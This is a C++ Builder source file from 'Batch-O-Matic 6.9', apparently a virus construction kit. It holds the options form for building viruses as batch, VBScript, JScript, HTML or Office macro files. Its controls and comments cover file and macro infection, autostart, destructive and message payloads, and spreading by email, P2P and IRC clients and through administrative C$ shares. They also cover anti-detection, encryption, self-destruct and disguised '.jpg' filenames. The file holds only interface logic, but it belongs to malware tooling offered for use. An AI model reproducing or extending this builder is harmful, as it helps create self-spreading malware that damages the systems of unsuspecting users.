/////////////////////////////////////////////////////////////////////////////
// Batch-O-Matic 6.9 Source Code - � 2002-2003 SAD1c - All Rights Reserved //
/////////////////////////////////////////////////////////////////////////////

#include <vcl.h>
#pragma hdrstop
#include "Unit1.h"
#include "Unit15.h"
//---------------------------------------------------------------------------
#pragma package(smart_init)
#pragma resource "*.dfm"
TForm15 *Form15;
//---------------------------------------------------------------------------
__fastcall TForm15::TForm15(TComponent* Owner)
        : TForm(Owner)
{
}
AnsiString vtype = "BAT";
//---------------------------------------------------------------------------
void __fastcall TForm15::Button5Click(TObject *Sender)
{
    Close();
}
//---------------------------------------------------------------------------
void __fastcall TForm15::Button4Click(TObject *Sender)
{
    Form15->Visible = false;
    Form1->Caption=" About Batch-O-Matic";
    Form1->ShowModal();
}
//---------------------------------------------------------------------------
void __fastcall TForm15::Button1Click(TObject *Sender)
{
    if (RadioButton17->Checked) Form1->SaveDialog1->Filter = "Text Files (*.txt)|*.txt|MS-DOS Batch (*.bat)|*.bat|WIN NT Batch (*.cmd)|*.cmd";
    if (RadioButton6->Checked) Form1->SaveDialog1->Filter = "Text Files (*.txt)|*.txt|VBScript (*.vbs)|*.vbs|VBScript (*.vbe)|*.vbe";
    if (RadioButton18->Checked) Form1->SaveDialog1->Filter = "Text Files (*.txt)|*.txt|JScript (*.js)|*.js|JScript (*.jse)|*.jse";
    if (RadioButton19->Checked) Form1->SaveDialog1->Filter = "Text Files (*.txt)|*.txt|HTML (*.htm)|*.htm|HTML (*.html)|*.html";
    if (RadioButton20->Checked) Form1->SaveDialog1->Filter = "Word Document (*.doc) + Macro source (*.cls) |*.doc;*.cls|Word Document (*.doc)|*.doc|Macro source (*.cls)|*.cls";
    if (RadioButton21->Checked) Form1->SaveDialog1->Filter = "Excel Sheet (*.xls) + Macro source (*.cls) |*.xls;*.cls|Excel Sheet (*.xls)|*.xls|Macro source (*.cls)|*.cls";
    Form15->Visible = false;
    Form1->Caption=" Disclaimer";
    Form1->ShowModal();
}
//---------------------------------------------------------------------------

void __fastcall TForm15::ListBox1Click(TObject *Sender)
{
    GroupBox30->Visible = false;
    GroupBox2->Visible = false;
    GroupBox3->Visible = false;
    GroupBox4->Visible = false;
    GroupBox5->Visible = false;
    GroupBox1->Visible = false;
    GroupBox6->Visible = false;
    GroupBox7->Visible = false;
    GroupBox8->Visible = false;
    GroupBox9->Visible = false;
    GroupBox10->Visible = false;
    GroupBox11->Visible = false;
    GroupBox12->Visible = false;
    GroupBox13->Visible = false;
    GroupBox14->Visible = false;
    GroupBox15->Visible = false;
    GroupBox16->Visible = false;
    GroupBox17->Visible = false;
    GroupBox18->Visible = false;
    GroupBox19->Visible = false;
    GroupBox20->Visible = false;
    GroupBox21->Visible = false;
    GroupBox22->Visible = false;
    GroupBox23->Visible = false;
    GroupBox24->Visible = false;
    GroupBox25->Visible = false;
    GroupBox26->Visible = false;
    GroupBox28->Visible = false;
    GroupBox29->Visible = false;
    GroupBox27->Visible = false;
    if (ListBox1->Selected[0] == true)
        GroupBox4->Visible = true; // comments
    if (ListBox1->Selected[1] == true)
        GroupBox30->Visible = true; // output file
    if (ListBox1->Selected[2] == true)
        GroupBox18->Visible = true; // install opt
    if (ListBox1->Selected[3] == true)
        GroupBox2->Visible = true; // reg start
    if (ListBox1->Selected[4] == true)
        GroupBox3->Visible = true; // addic start
    if (ListBox1->Selected[5] == true)
        GroupBox5->Visible = true; // shell spawn
    if (ListBox1->Selected[6] == true)
        GroupBox1->Visible = true; // inf
    if (ListBox1->Selected[7] == true)
        GroupBox14->Visible = true; // files to inf
    if (ListBox1->Selected[8] == true)
        GroupBox7->Visible = true;  // inf type
    if (ListBox1->Selected[9] == true)
        GroupBox27->Visible = true; // macro inf.
    if (ListBox1->Selected[10] == true)
        GroupBox6->Visible = true;  // add inf
    if (ListBox1->Selected[11] == true)
        GroupBox10->Visible = true; // payl actv
    if (ListBox1->Selected[12] == true)
        GroupBox8->Visible = true;  // run32 payl
    if (ListBox1->Selected[13] == true)
        GroupBox15->Visible = true; // res payl
    if (ListBox1->Selected[14] == true)
        GroupBox19->Visible = true;  // des payl
    if (ListBox1->Selected[15] == true)
        GroupBox20->Visible = true;  // msg payl
    if (ListBox1->Selected[16] == true)
        GroupBox9->Visible = true;  // misc payl
    if (ListBox1->Selected[17] == true)
        GroupBox11->Visible = true; // mail spread
    if (ListBox1->Selected[18] == true)
        GroupBox12->Visible = true; // p2p spread
    if (ListBox1->Selected[19] == true)
        GroupBox22->Visible = true; // mirc spread
    if (ListBox1->Selected[20] == true)
        GroupBox23->Visible = true; // pirch spread
    if (ListBox1->Selected[21] == true)
        GroupBox24->Visible = true; // virc spread
    if (ListBox1->Selected[22] == true)
        GroupBox26->Visible = true; // drives sharing
    if (ListBox1->Selected[23] == true)
        GroupBox13->Visible = true; // anti detect
    if (ListBox1->Selected[24] == true)
        GroupBox28->Visible = true; // encryption
    if (ListBox1->Selected[25] == true)
        GroupBox17->Visible = true; // notif
    if (ListBox1->Selected[26] == true)
        GroupBox16->Visible = true; // self destr
    if (ListBox1->Selected[27] == true)
        GroupBox25->Visible = true; // file include
    if (ListBox1->Selected[28] == true)
        GroupBox21->Visible = true; // auto-update
    if (ListBox1->Selected[29] == true)
        GroupBox29->Visible = true; // addictional code
}
//---------------------------------------------------------------------------

void __fastcall TForm15::CheckBox39Click(TObject *Sender)
{
    if (CheckBox39->Checked == true)
    {
        Edit13->Enabled = true;
        Edit3->Enabled = true;
        ComboBox13->Enabled = true;
        CheckBox71->Enabled = true;
        CheckBox72->Enabled = true;
    }
    else
    {
        Edit13->Enabled = false;
        Edit3->Enabled = false;
        ComboBox13->Enabled = false;
        CheckBox71->Enabled = false;
        CheckBox72->Enabled = false;
    }
}
//---------------------------------------------------------------------------

void __fastcall TForm15::CheckBox34Click(TObject *Sender)
{
    if (CheckBox34->Checked == true) ComboBox5->Enabled = true;
    else ComboBox5->Enabled = false;
}
//---------------------------------------------------------------------------

void __fastcall TForm15::CheckBox35Click(TObject *Sender)
{
    if (CheckBox35->Checked == true) ComboBox6->Enabled = true;
    else ComboBox6->Enabled = false;
}
//---------------------------------------------------------------------------

void __fastcall TForm15::FormCreate(TObject *Sender)
{
    randomize();
    RandSeed = random(100000);
    Edit10->Text = Form1->NameRand(0) + Form1->NameRand(0);
    Edit11->Text = Form1->NameRand(0) + Form1->NameRand(0);
    Edit12->Text = Form1->NameRand(0) + Form1->NameRand(0);
    Edit22->Text = Form1->NameRand(0) + Form1->NameRand(0);
    Edit23->Text = Form1->NameRand(0) + Form1->NameRand(0);
    Memo4->Clear();
    Memo4->Lines->Add(Form1->NameRand(1) + Form1->NameRand(1) + ".jpg");
    ComboBox14->Text = Form1->StrRand(3, 3);
    Memo2->Lines->Add(Form1->NameRand(1) + Form1->StrRand(4, 3)+".jpg");
    Memo2->Lines->Add(Form1->NameRand(1) + Form1->StrRand(5, 3)+".jpg");
    Memo2->Lines->Add(Form1->NameRand(1) + Form1->StrRand(4, 3)+".jpg");
    Edit18->Text = Form1->NameRand(1) +"_"+ Form1->NameRand(1) + ".jpg";
    Edit19->Text = Form1->NameRand(1) +"_"+ Form1->NameRand(1) + ".jpg";
    Edit20->Text = Form1->NameRand(1) +"_"+ Form1->NameRand(1) + ".jpg";
    Label29->Caption = "BAT."+Edit1->Text+"."+Edit5->Text+Edit9->Text;
    Label39->Caption = "Example: for drive \"C\" && with IP=152.0.0.1,\ngoto \"\\\\152.0.0.1\\"+Edit4->Text+"C$\" while online";
}
//---------------------------------------------------------------------------

void __fastcall TForm15::RadioButton10Click(TObject *Sender)
{
    ComboBox7->Enabled = true;
    ComboBox8->Enabled = false;
    ComboBox9->Enabled = false;
    ComboBox11->Enabled = false;
}
//---------------------------------------------------------------------------

void __fastcall TForm15::RadioButton11Click(TObject *Sender)
{
    ComboBox7->Enabled = false;
    ComboBox8->Enabled = true;
    ComboBox9->Enabled = true;
    ComboBox11->Enabled = true;
}
//---------------------------------------------------------------------------

void __fastcall TForm15::CheckBox53Click(TObject *Sender)
{
    if (CheckBox53->Checked == true)
    {
        RadioButton10->Enabled = true;
        RadioButton11->Enabled = true;
        RadioButton10->Checked = true;
        ComboBox7->Enabled = true;
        ComboBox8->Enabled = false;
        ComboBox9->Enabled = false;
    }
    else
    {
        RadioButton10->Enabled = false;
        RadioButton11->Enabled = false;
        RadioButton10->Checked = false;
        RadioButton11->Checked = false;
        ComboBox7->Enabled = false;
        ComboBox8->Enabled = false;
        ComboBox9->Enabled = false;
    }
}
//---------------------------------------------------------------------------

void __fastcall TForm15::CheckBox54Click(TObject *Sender)
{
    if (CheckBox54->Checked == true)
    {
        Edit8->Enabled = true;
        CheckBox55->Enabled = true;
        CheckBox56->Enabled = true;
    }
    else
    {
        Edit8->Enabled = false;
        CheckBox55->Enabled = false;
        CheckBox56->Enabled = false;
    }
}
//---------------------------------------------------------------------------

void __fastcall TForm15::CheckBox44Click(TObject *Sender)
{
    if (CheckBox44->Checked == true)
    {
        CheckBox21->Enabled = false;
        CheckBox23->Enabled = false;
        CheckBox27->Enabled = false;
        CheckBox28->Enabled = false;
        CheckBox29->Enabled = false;
        CheckBox24->Enabled = false;
        CheckBox21->Checked = false;
        CheckBox23->Checked = false;
        CheckBox27->Checked = false;
        CheckBox28->Checked = false;
        CheckBox29->Checked = false;
        CheckBox24->Checked = false;
        CheckBox63->Enabled = true;
    }
    else
    {
        CheckBox21->Enabled = true;
        CheckBox23->Enabled = true;
        CheckBox27->Enabled = true;
        CheckBox28->Enabled = true;
        CheckBox29->Enabled = true;
        CheckBox24->Enabled = true;
        CheckBox63->Enabled = false;
        CheckBox63->Checked = false;
    }
}
//---------------------------------------------------------------------------

void __fastcall TForm15::RadioButton13Click(TObject *Sender)
{
    CheckBox68->Enabled = true;
    CheckBox67->Enabled = true;
    CheckBox64->Enabled = false;
    CheckBox65->Enabled = false;
    CheckBox66->Enabled = false;
    CheckBox73->Enabled = false;
    if (CheckBox68->Checked == false) CheckBox67->Checked = true;
}
//---------------------------------------------------------------------------

void __fastcall TForm15::RadioButton12Click(TObject *Sender)
{
    CheckBox68->Enabled = false;
    CheckBox67->Enabled = false;
    CheckBox64->Enabled = true;
    CheckBox65->Enabled = true;
    CheckBox66->Enabled = true;
    CheckBox73->Enabled = true;
}
//---------------------------------------------------------------------------

void __fastcall TForm15::RadioButton14Click(TObject *Sender)
{
    CheckBox68->Enabled = false;
    CheckBox67->Enabled = false;
    CheckBox64->Enabled = false;
    CheckBox65->Enabled = false;
    CheckBox66->Enabled = false;
    CheckBox73->Enabled = false;
}
//---------------------------------------------------------------------------

void __fastcall TForm15::RadioButton15Click(TObject *Sender)
{
    CheckBox68->Enabled = false;
    CheckBox67->Enabled = false;
    CheckBox64->Enabled = false;
    CheckBox65->Enabled = false;
    CheckBox66->Enabled = false;
    CheckBox73->Enabled = false;   
}
//---------------------------------------------------------------------------

void __fastcall TForm15::CheckBox67Click(TObject *Sender)
{
    if (CheckBox67->Checked) CheckBox68->Checked = false;
    else CheckBox68->Checked = true;
}
//---------------------------------------------------------------------------

void __fastcall TForm15::CheckBox68Click(TObject *Sender)
{
    if (CheckBox68->Checked) CheckBox67->Checked = false;
    else CheckBox67->Checked = true;
}
//---------------------------------------------------------------------------

void __fastcall TForm15::CheckBox46Click(TObject *Sender)
{
    if (CheckBox46->Checked)
    {
        CheckBox47->Enabled = true;
        ComboBox10->Enabled = true;
        Edit14->Enabled = true;
        Edit16->Enabled = true;
    }
    else
    {
        CheckBox47->Enabled = false;
        ComboBox10->Enabled = false;
        Edit14->Enabled = false;
        Edit16->Enabled = false;
    }
}
//---------------------------------------------------------------------------

void __fastcall TForm15::Label16Click(TObject *Sender)
{
    Edit10->Text = Form1->NameRand(0) + Form1->NameRand(0);
}
//---------------------------------------------------------------------------

void __fastcall TForm15::Label19Click(TObject *Sender)
{
    Edit11->Text = Form1->NameRand(0) + Form1->NameRand(0);
}
//---------------------------------------------------------------------------

void __fastcall TForm15::Label22Click(TObject *Sender)
{
    Edit12->Text = Form1->NameRand(0) + Form1->NameRand(0);
}
//---------------------------------------------------------------------------

void __fastcall TForm15::Label7Click(TObject *Sender)
{
    Memo4->Clear();
    Memo4->Lines->Add(Form1->NameRand(1) + Form1->NameRand(1) + ".jpg");
    Memo4->SelStart = 0;
    Memo4->SelLength = 0;
}
//---------------------------------------------------------------------------

void __fastcall TForm15::Label2Click(TObject *Sender)
{
    Memo2->Clear();
    Memo2->Lines->Add(Form1->NameRand(1) + Form1->StrRand(4, 3)+".jpg");
    Memo2->Lines->Add(Form1->NameRand(1) + Form1->StrRand(5, 3)+".jpg");
    Memo2->Lines->Add(Form1->NameRand(1) + Form1->StrRand(4, 3)+".jpg");
    Memo2->SelStart = 0;
    Memo2->SelLength = 0;
}
//---------------------------------------------------------------------------

void __fastcall TForm15::Label8Click(TObject *Sender)
{
    Edit18->Text = Form1->NameRand(1) +"_"+ Form1->NameRand(1) + ".jpg";
}
//---------------------------------------------------------------------------

void __fastcall TForm15::Label13Click(TObject *Sender)
{
    Edit19->Text = Form1->NameRand(1) +"_"+ Form1->NameRand(1) + ".jpg";
}
//---------------------------------------------------------------------------

void __fastcall TForm15::Label26Click(TObject *Sender)
{
    Edit20->Text = Form1->NameRand(1) +"_"+ Form1->NameRand(1) + ".jpg";
}
//---------------------------------------------------------------------------

void __fastcall TForm15::CheckBox50Click(TObject *Sender)
{
    CheckBox74->Enabled = CheckBox50->Checked;
    CheckBox75->Enabled = CheckBox50->Checked;
    CheckBox79->Enabled = CheckBox50->Checked;
    CheckBox80->Enabled = CheckBox50->Checked;
    CheckBox81->Enabled = CheckBox50->Checked;
    Label2->Enabled = CheckBox50->Checked;
    Memo2->Enabled = CheckBox50->Checked;
    ComboBox16->Enabled = CheckBox50->Checked;
}
//---------------------------------------------------------------------------

void __fastcall TForm15::CheckBox77Click(TObject *Sender)
{
    Label26->Enabled = CheckBox77->Checked;
    Edit20->Enabled = CheckBox77->Checked;
    ComboBox19->Enabled = CheckBox77->Checked;
}
//---------------------------------------------------------------------------

void __fastcall TForm15::CheckBox78Click(TObject *Sender)
{
    Label13->Enabled = CheckBox78->Checked;
    Edit19->Enabled = CheckBox78->Checked;
    Edit21->Enabled = CheckBox78->Checked;
    ComboBox18->Enabled = CheckBox78->Checked;
}
//---------------------------------------------------------------------------

void __fastcall TForm15::CheckBox76Click(TObject *Sender)
{
    Label8->Enabled = CheckBox76->Checked;
    Edit17->Enabled = CheckBox76->Checked;
    Edit18->Enabled = CheckBox76->Checked;
    ComboBox17->Enabled = CheckBox76->Checked;
}
//---------------------------------------------------------------------------

void __fastcall TForm15::Edit1Change(TObject *Sender)
{
    if (Edit5->Text+Edit9->Text != "")
        Label29->Caption = vtype+"."+Edit1->Text+"."+Edit5->Text+Edit9->Text;
    else
        Label29->Caption = vtype+"."+Edit1->Text;
}
//---------------------------------------------------------------------------

void __fastcall TForm15::Edit5Change(TObject *Sender)
{
    if (Edit5->Text+Edit9->Text != "")
        Label29->Caption = vtype+"."+Edit1->Text+"."+Edit5->Text+Edit9->Text;
    else
        Label29->Caption = vtype+"."+Edit1->Text;
}
//---------------------------------------------------------------------------

void __fastcall TForm15::Edit9Change(TObject *Sender)
{
    if (Edit5->Text+Edit9->Text != "")
        Label29->Caption = vtype+"."+Edit1->Text+"."+Edit5->Text+Edit9->Text;
    else
        Label29->Caption = vtype+"."+Edit1->Text;
}
//---------------------------------------------------------------------------

void __fastcall TForm15::CheckBox42Click(TObject *Sender)
{
    ComboBox3->Enabled = CheckBox42->Checked;
}
//---------------------------------------------------------------------------

void __fastcall TForm15::CheckBox45Click(TObject *Sender)
{
    ComboBox1->Enabled = CheckBox45->Checked;
    ComboBox2->Enabled = CheckBox45->Checked;
}
//---------------------------------------------------------------------------

void __fastcall TForm15::Label30Click(TObject *Sender)
{
    Edit22->Text = Form1->NameRand(0) + Form1->NameRand(0);
}
//---------------------------------------------------------------------------

void __fastcall TForm15::Label32Click(TObject *Sender)
{
    Edit23->Text = Form1->NameRand(0) + Form1->NameRand(0);
}
//---------------------------------------------------------------------------

void __fastcall TForm15::CheckBox61Click(TObject *Sender)
{
    Memo1->Enabled = CheckBox61->Checked;
    Memo3->Enabled = CheckBox61->Checked;
    Memo4->Enabled = CheckBox61->Checked;
    CheckBox86->Enabled = CheckBox61->Checked;
    ComboBox20->Enabled = CheckBox61->Checked;
    ComboBox21->Enabled = CheckBox61->Checked;
    CheckBox87->Enabled = CheckBox61->Checked;
    CheckBox88->Enabled = CheckBox61->Checked;
    CheckBox91->Enabled = CheckBox61->Checked;
    CheckBox94->Enabled = CheckBox61->Checked;
    Label7->Enabled = CheckBox61->Checked;
    if (CheckBox61->Checked)
    {
        Memo3->Enabled = !CheckBox86->Checked;
        Memo4->Enabled = !CheckBox86->Checked;
        ComboBox20->Enabled = !CheckBox86->Checked;
        Memo5->Enabled = CheckBox91->Checked;
        Label40->Enabled = CheckBox91->Checked;
    }
}
//---------------------------------------------------------------------------

void __fastcall TForm15::CheckBox82Click(TObject *Sender)
{
    Button2->Enabled = CheckBox82->Checked;
    Edit25->Enabled = CheckBox82->Checked;
    ComboBox22->Enabled = CheckBox82->Checked;
    ComboBox23->Enabled = CheckBox82->Checked;
    CheckBox83->Enabled = CheckBox82->Checked;
}
//---------------------------------------------------------------------------

void __fastcall TForm15::Button2Click(TObject *Sender)
{
    if (OpenDialog1->Execute())
        Edit24->Text = OpenDialog1->FileName;
}
//---------------------------------------------------------------------------

void __fastcall TForm15::CheckBox86Click(TObject *Sender)
{
    Memo3->Enabled = !CheckBox86->Checked;
    Memo4->Enabled = !CheckBox86->Checked;
    ComboBox20->Enabled = !CheckBox86->Checked;
    CheckBox91->Enabled = !CheckBox86->Checked;
    if (CheckBox86->Checked == false)
    {
        Memo5->Enabled = CheckBox91->Checked;
        Label40->Enabled = CheckBox91->Checked;
    }
    else
    {
        Memo5->Enabled = false;
        Label40->Enabled = false;
    }
}
//---------------------------------------------------------------------------


void __fastcall TForm15::Edit4Change(TObject *Sender)
{
    Label39->Caption = "Example: for drive \"C\" && with IP=152.0.0.1,\ngoto \"\\\\152.0.0.1\\"+Edit4->Text+"C$\" while online";    
}
//---------------------------------------------------------------------------

void __fastcall TForm15::CheckBox84Click(TObject *Sender)
{
    CheckBox89->Enabled = CheckBox84->Checked;
    Edit4->Enabled = CheckBox84->Checked;
}
//---------------------------------------------------------------------------

void __fastcall TForm15::Label40Click(TObject *Sender)
{
    Memo5->Clear();
    Memo5->Lines->Add(Form1->NameRand(1) + Form1->NameRand(1) + ".jpg");
    Memo5->SelStart = 0;
    Memo5->SelLength = 0;
}
//---------------------------------------------------------------------------

void __fastcall TForm15::CheckBox91Click(TObject *Sender)
{
    Memo5->Enabled = CheckBox91->Checked;
    Label40->Enabled = CheckBox91->Checked;
}
//---------------------------------------------------------------------------


void __fastcall TForm15::RadioButton4Click(TObject *Sender)
{
    ComboBox12->Enabled = false;
    CheckBox20->Checked = false;
    CheckBox14->Checked = false;
}
//---------------------------------------------------------------------------

void __fastcall TForm15::RadioButton3Click(TObject *Sender)
{
    ComboBox12->Enabled = true;
}
//---------------------------------------------------------------------------

void __fastcall TForm15::CheckBox20Click(TObject *Sender)
{
    if (RadioButton4->Checked) CheckBox20->Checked = false;
}
//---------------------------------------------------------------------------

void __fastcall TForm15::CheckBox14Click(TObject *Sender)
{
    if (RadioButton4->Checked) CheckBox14->Checked = false;    
}
//---------------------------------------------------------------------------

void __fastcall TForm15::CheckBox93Click(TObject *Sender)
{
    Memo6->Enabled = CheckBox93->Checked;
    Memo7->Enabled = CheckBox93->Checked;
}
//---------------------------------------------------------------------------

void __fastcall TForm15::CheckBox49Click(TObject *Sender)
{
    CheckBox60->Enabled = CheckBox49->Checked;
    CheckBox95->Enabled = CheckBox49->Checked;
}
//---------------------------------------------------------------------------

void __fastcall TForm15::CheckBox96Click(TObject *Sender)
{
    ComboBox24->Enabled = CheckBox96->Checked;
    CheckBox98->Enabled = CheckBox96->Checked | CheckBox97->Checked;
    CheckBox99->Enabled = CheckBox96->Checked | CheckBox97->Checked;
    if (ComboBox20->Text == ".doc") ComboBox20->ItemIndex = 0;
    if (ComboBox16->Text == ".doc") ComboBox16->ItemIndex = 0;
    if (ComboBox17->Text == ".doc") ComboBox17->ItemIndex = 0;
    if (ComboBox18->Text == ".doc") ComboBox18->ItemIndex = 0;
    if (ComboBox19->Text == ".doc") ComboBox19->ItemIndex = 0;
}
//---------------------------------------------------------------------------

void __fastcall TForm15::CheckBox97Click(TObject *Sender)
{
    ComboBox25->Enabled = CheckBox97->Checked;
    CheckBox98->Enabled = CheckBox96->Checked | CheckBox97->Checked;
    CheckBox99->Enabled = CheckBox96->Checked | CheckBox97->Checked;
    if (ComboBox20->Text == ".xls") ComboBox20->ItemIndex = 0;
    if (ComboBox16->Text == ".xls") ComboBox16->ItemIndex = 0;
    if (ComboBox17->Text == ".xls") ComboBox17->ItemIndex = 0;
    if (ComboBox18->Text == ".xls") ComboBox18->ItemIndex = 0;
    if (ComboBox19->Text == ".xls") ComboBox19->ItemIndex = 0;
}
//---------------------------------------------------------------------------

void __fastcall TForm15::ComboBox20Change(TObject *Sender)
{
    if (ComboBox20->Text == ".doc" && CheckBox96->Checked == false)
    {
        ComboBox20->ItemIndex = 0;
        ShowMessage("You must check MS Word infection first!");
    }
    if (ComboBox20->Text == ".xls" && CheckBox97->Checked == false)
    {
        ComboBox20->ItemIndex = 0;
        ShowMessage("You must check MS Excel infection first!");
    }
}
//---------------------------------------------------------------------------

void __fastcall TForm15::ComboBox16Change(TObject *Sender)
{
    if (ComboBox16->Text == ".doc" && CheckBox96->Checked == false)
    {
        ComboBox16->ItemIndex = 0;
        ShowMessage("You must check MS Word infection first!");
    }
    if (ComboBox16->Text == ".xls" && CheckBox97->Checked == false)
    {
        ComboBox16->ItemIndex = 0;
        ShowMessage("You must check MS Excel infection first!");
    }
}
//---------------------------------------------------------------------------

void __fastcall TForm15::ComboBox17Change(TObject *Sender)
{
    if (ComboBox17->Text == ".doc" && CheckBox96->Checked == false)
    {
        ComboBox17->ItemIndex = 0;
        ShowMessage("You must check MS Word infection first!");
    }
    if (ComboBox17->Text == ".xls" && CheckBox97->Checked == false)
    {
        ComboBox17->ItemIndex = 0;
        ShowMessage("You must check MS Excel infection first!");
    }
}
//---------------------------------------------------------------------------

void __fastcall TForm15::ComboBox18Change(TObject *Sender)
{
    if (ComboBox18->Text == ".doc" && CheckBox96->Checked == false)
    {
        ComboBox18->ItemIndex = 0;
        ShowMessage("You must check MS Word infection first!");
    }
    if (ComboBox18->Text == ".xls" && CheckBox97->Checked == false)
    {
        ComboBox18->ItemIndex = 0;
        ShowMessage("You must check MS Excel infection first!");
    }
}
//---------------------------------------------------------------------------

void __fastcall TForm15::ComboBox19Change(TObject *Sender)
{
    if (ComboBox19->Text == ".doc" && CheckBox96->Checked == false)
    {
        ComboBox19->ItemIndex = 0;
        ShowMessage("You must check MS Word infection first!");
    }
    if (ComboBox19->Text == ".xls" && CheckBox97->Checked == false)
    {
        ComboBox19->ItemIndex = 0;
        ShowMessage("You must check MS Excel infection first!");
    }
}
//---------------------------------------------------------------------------

void __fastcall TForm15::RadioButton17Click(TObject *Sender)
{
    vtype = "BAT";
    Edit1Change(NULL);
}
//---------------------------------------------------------------------------

void __fastcall TForm15::RadioButton6Click(TObject *Sender)
{
    vtype = "VBS";
    Edit1Change(NULL);
}
//---------------------------------------------------------------------------

void __fastcall TForm15::RadioButton18Click(TObject *Sender)
{
    vtype = "JS";
    Edit1Change(NULL);
}
//---------------------------------------------------------------------------

void __fastcall TForm15::RadioButton19Click(TObject *Sender)
{
    vtype = "HTML";
    Edit1Change(NULL);
}
//---------------------------------------------------------------------------

void __fastcall TForm15::RadioButton21Click(TObject *Sender)
{
    vtype = "Macro.Excel";
    Edit1Change(NULL);
}
//---------------------------------------------------------------------------

void __fastcall TForm15::RadioButton20Click(TObject *Sender)
{
    vtype = "Macro.Word";
    Edit1Change(NULL);
}
//---------------------------------------------------------------------------

